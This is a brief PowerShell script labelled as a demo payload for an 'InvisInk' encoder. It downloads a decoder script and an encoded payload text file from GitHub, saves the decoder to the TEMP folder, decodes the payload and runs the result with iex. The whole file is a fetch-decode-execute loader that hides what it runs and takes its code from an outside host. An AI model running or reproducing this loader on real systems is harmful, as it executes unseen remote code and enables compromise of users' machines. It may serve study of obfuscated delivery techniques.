# REDDs InvisInk Demo Payload
# Ver: 1.0.1

$scriptURL = "https://raw.githubusercontent.com/InfoSecREDD/InvisInk-Encoder/main/IIDecode.ps1"
$fileURL = "https://raw.githubusercontent.com/InfoSecREDD/InvisInk-Encoder/main/invpayload.txt"

$fileContent = (iwr -UseBasicParsing -Uri $fileURL).Content;
irm $scriptURL -OutFile "$env:TEMP\i.ps1"; $INV = & "$env:TEMP\i.ps1" -Str $fileContent
iex "$INV"